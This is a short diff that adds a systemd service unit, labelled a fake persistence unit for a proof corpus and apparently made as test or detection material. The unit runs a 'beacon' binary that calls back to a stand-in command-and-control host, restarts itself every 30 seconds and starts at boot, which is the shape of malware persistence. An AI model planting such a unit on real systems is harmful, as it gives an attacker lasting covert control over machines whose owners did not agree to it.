@@ -1,0 +1,11 @@
+[Unit]
+Description=Fake persistence unit for proof corpus
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/beacon --callback https://c2.example.com
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
